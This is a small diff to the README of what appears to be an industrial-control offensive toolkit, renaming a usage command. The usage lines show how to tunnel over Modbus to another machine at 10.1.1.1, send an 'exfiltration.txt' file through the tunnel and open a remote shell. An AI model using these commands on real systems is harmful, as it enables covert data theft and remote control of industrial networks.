@@ -66,7 +66,7 @@ pip3 install -r requirements.txt
 > tunnel listen tcp::6666                         # setup modbus tunnel service
 > tunnel connect tcp:10.1.1.1:6666                # connect from another comp
 > tunnel send exfiltration.txt                    # send files through tunnel
-> tunnel terminal                                 # or open a terminal session
+> tunnel shell                                    # or open a terminal session
 > historian tcp:10.1.1.1:9300                     # transactions to cthistorian
 ```
 
